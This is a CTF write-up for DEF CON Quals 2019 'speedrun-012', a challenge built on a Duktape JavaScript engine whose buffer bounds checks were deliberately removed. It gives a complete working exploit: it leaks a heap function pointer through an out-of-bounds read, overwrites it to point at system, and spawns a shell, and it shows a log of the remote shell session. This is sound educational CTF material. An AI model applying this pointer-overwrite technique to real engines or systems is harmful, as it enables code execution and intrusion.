+++
title = "DEF CON Quals 2019 - Speedrun 12"
date = "2019-05-14 00:53:00"
categories = ["pwn", "writeup"]
+++
## desc
[https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a](https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a)

> Downloads :
> [speedrun-012](/ctf/assets/defcon/speedrun-012/speedrun-012)
> [solve.js](/ctf/assets/defcon/speedrun-012/solve.js)
> [solve.py](/ctf/assets/defcon/speedrun-012/solve.py)

## intro
This article is written by a first timer to experience "exploiting" ~~real~~ JS engine. :p

> Duktape is an embeddable Javascript engine, with a focus on portability and compact footprint.

In short we have a mini JS engine pwn. The `main` function is realtively easy to read,
```C
  setvbuf(stdout, NULL, _IONBF, 0);
  ctx = duk_create_heap(NULL, NULL, NULL, NULL, fatal_error);
  duk_push_c_function(ctx, native_print, -1);
  duk_put_global_string(ctx, "print");
  if ( !getenv("DEBUG") )
    alarm(5);
  if ( getenv("USE_SYSTEM") )
  {
    duk_push_c_function(ctx, native_system, -1);
    duk_put_global_string(ctx, "system");
  }
  memset(input, 0, 0x400);
  read(0, input, 0x3FF);
  duk_eval_raw(ctx, input, 0, 0xE08);
  duk_pop(ctx);
  duk_destroy_heap(ctx);
```
First, the program create the `ctx` for duktape, then register `print` function to ctx "stack". `print` it self doesn't have anything fancy, only calling `puts` to the concatenated argument passed to it. We also have `native_system` might be useful for later stage, so take note of it. Near the end, the program tries to read JS from user the eval it.

## finding bugs
From the gists, we could see the author did some change to the builtins, the most interesting ones are these,

from line 765-776
```diff
@@ -2347,10 +2344,7 @@
 	switch (magic_ftype) {
 	case DUK__FLD_8BIT: {
 		duk_uint8_t tmp;
-		if (offset + 1U > check_length) {
-			goto fail_bounds;
-		}
-		tmp = buf[offset];
+		tmp = buf[offset_signed];
 		if (magic_signed) {
 			duk_push_int(thr, (duk_int_t) ((duk_int8_t) tmp));
} else {
```
from line 866-883
```diff
@@ -2653,16 +2670,13 @@
 	}
 	case DUK__FLD_32BIT: {
 		duk_uint32_t tmp;
-		if (offset + 4U > check_length) {
-			goto fail_bounds;
-		}
 		tmp = (duk_uint32_t) duk_to_uint32(thr, 0);
 		if (endswap) {
 			tmp = DUK_BSWAP32(tmp);
 		}
 		du.ui[0] = tmp;
 		/* sign doesn't matter when writing */
-		duk_memcpy((void *) (buf + offset), (const void *) du.uc, 4);
+		duk_memcpy((void *) (buf + offset_signed), (const void *) du.uc, 4);
 		break;
 	}
case DUK__FLD_FLOAT: {
```
The first one is from `duk_bi_buffer.c` -> `duk_bi_buffer_readfield()`, or in JS `Buffer.read[bitsize]()`. This is on `DUK__FLD_8BIT`, so we could also assume this is in `readUInt8()`. The removed lines are checking against `offset + BLAH`, this could be a bound check for read. Well, you wouldn't want the buffer read past the size or certain check_length. Testing it to confirm our assumption,
```
$ cat test.js
var a = new OOOBufferOOO(64);
print(a.readUInt8(66));
$ ./speedrun-012 < test.js
5
```
Well, that's clearly an OOB read, usually you would get an `undefined` as result when trying to read past the size.

The second one is from `duk_bi_buffer.c` -> `duk_bi_buffer_writefield()`. Well, you could guess from the first one, this is an OOB write in `writeUInt32LE/BE()`. To check it again,
```
$ cat test.js
var a = new OOOBufferOOO(64);
print(a.readUInt8(66));
a.writeUInt32LE(99, 66);
print(a.readUInt8(66));
$ ./speedrun-012 < test.js
5
99
```

## finding attack vector
Now, we already have R/W primitive, but how to get the shell? The binary has complete protection (NX bit, FULL RELRO, etc.), but... do you still remember that we have `native_system` in the binary, and the fact that `print` register `native_print` into the ctx stack? Well, see where this will be going? Try to hack this yourself!

> damn. Just give me the PoC now. sheesh.

> ok :|

## attaccc
Well, the idea is to overwrite the function pointer of `native_print` that get push-ed into ctx stack, which actually lies in heap section. The first step is to find offset difference between `OOOBufferOOO` and `native_print`. A simple nice trick to know where out buffer will lands on memory is to create a unique id. For example,
```js
var a = new OOOBufferOOO(64);
a[0] = 0xEF;
a[1] = 0xBE;
a[2] = 0xAD;
a[3] = 0xDE;
```
I've set a to has 0xdeadbeef, then use search in pwndbg,
```
pwndbg> search -t dword 0xdeadbeef
[heap]          0x5555557cbe80 0xdeadbeef
pwndbg> search -t qword $rebase(native_print)
[heap]          0x5555557d5af8 0x55555555e270
```
To get the offset difference, you'll just need substract it, ofc :p. `0x5555557cbe80-0x5555557d5af8` -> `0x9c78`. Since duktape can't handle 64bit values, we could only just use 32 bit vars, but it's enough for this case. Try leaking the lower 4 byte of PIE offset,
```js
pie = a.readUInt8(0x9c7b);
pie = pie << 8;
pie|= a.readUInt8(0x9c7a);
pie = pie << 8;
pie|= a.readUInt8(0x9c79);
pie = pie << 8;
pie|= a.readUInt8(0x9c78);
print(pie.toString(16));

pie -= native_print;
print(pie.toString(16)); // PIE
```
After that we just need to overwrite the function pointer to `native_system`,
```js
a.writeUInt32LE(pie + native_system, 0x9c78)
```
Now, calling `print()` will be the same as `system()`,
```js
print('/bin/sh') // system('/bin/sh')
```

## full solver and FLAGG
```js
// note
// a.readUInt8(pos);
// a.writeUInt32LE(val, pos);

// kindofzfillbutsuperlame
// function pad(b) {
// 	while (b.length < 2) b = '0' + b;
// 	return b;
// }

// mini "hexdump"
// for (var i = -0x5F18; i < -0x5F00; i += 16) {
// 	r = ''
// 	for (var j = i; j < i + 16; ++j)
// 		r += pad(a.readUInt8(j).toString(16)) + ' ';
// 	print(r);
// }

var a = new OOOBufferOOO(64);
native_system = 0xA220;
native_print = 0xA270;

a[0] = 0xEF;
a[1] = 0xBE;
a[2] = 0xAD;
a[3] = 0xDE;

pie = a.readUInt8(0x9c7b);
pie = pie << 8;
pie|= a.readUInt8(0x9c7a);
pie = pie << 8;
pie|= a.readUInt8(0x9c79);
pie = pie << 8;
pie|= a.readUInt8(0x9c78);
print(pie.toString(16));

pie -= native_print;
print(pie.toString(16));

a.writeUInt32LE(pie + native_system, 0x9c78)
print('/bin/sh')
```

```
λ › python2 solve.py
[+] Opening connection to speedrun-012.quals2019.oooverflow.io on port 31337: Done
[*] Switching to interactive mode
20eb0270
20ea6000
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat flag
OOO{Rule #3: Never `open` the package. Who knows what pwns are lying about?
```